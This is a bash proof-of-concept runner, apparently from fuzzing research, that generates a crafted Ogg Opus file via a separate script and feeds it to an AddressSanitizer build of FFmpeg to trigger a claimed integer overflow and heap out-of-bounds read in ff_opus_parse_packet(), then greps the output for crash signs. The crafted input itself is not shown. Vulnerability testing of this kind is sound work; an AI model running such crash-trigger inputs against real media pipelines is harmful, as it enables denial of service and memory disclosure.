#!/bin/bash
# PoC runner for VULN 001: Integer overflow in ff_opus_parse_packet()
# Generates vuln_001_input.ogg and feeds it to FFmpeg to trigger heap OOB read.

set -uo pipefail
cd "$(dirname "$0")"

FFMPEG=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
INPUT=vuln_001_input.ogg
RESULT=vuln_001_result.txt
ASAN_LOG=asan_001.log

echo "[*] Step 1: Generating crafted Ogg Opus file..."
python3 vuln_001_gen.py
echo "[+] Generated: $INPUT ($(du -h "$INPUT" | cut -f1))"

echo ""
echo "[*] Step 2: Running FFmpeg with crafted input..."
ASAN_OPTIONS="abort_on_error=0:log_path=./${ASAN_LOG}:detect_leaks=0" \
    "$FFMPEG" -i "$INPUT" -f null - >"$RESULT" 2>&1 || true

# Collect ASAN output
echo "" >> "$RESULT"
if ls "${ASAN_LOG}".* >/dev/null 2>&1; then
    echo "=== ASAN OUTPUT ===" >> "$RESULT"
    cat "${ASAN_LOG}".* >> "$RESULT" 2>/dev/null || true
fi

echo ""
echo "[*] FFmpeg output:"
cat "$RESULT"

echo ""
echo "[*] Step 3: Checking for crash indicators..."
if grep -qE "ERROR: AddressSanitizer|heap-buffer-overflow|heap-use-after-free|stack-buffer-overflow|SEGV|signal 11" "$RESULT" 2>/dev/null; then
    echo "VERIFIED_CRASH" | tee vuln_001_status.txt
elif grep -qE "Segmentation fault|Aborted|Killed|double free|invalid read|invalid write" "$RESULT" 2>/dev/null; then
    echo "VERIFIED_CRASH" | tee vuln_001_status.txt
elif grep -qE "Error parsing|Invalid data|corruption|overflow" "$RESULT" 2>/dev/null; then
    echo "VERIFIED_BEHAVIOR" | tee vuln_001_status.txt
else
    echo "UNVERIFIED" | tee vuln_001_status.txt
fi

echo "[*] Done. Status: $(cat vuln_001_status.txt)"
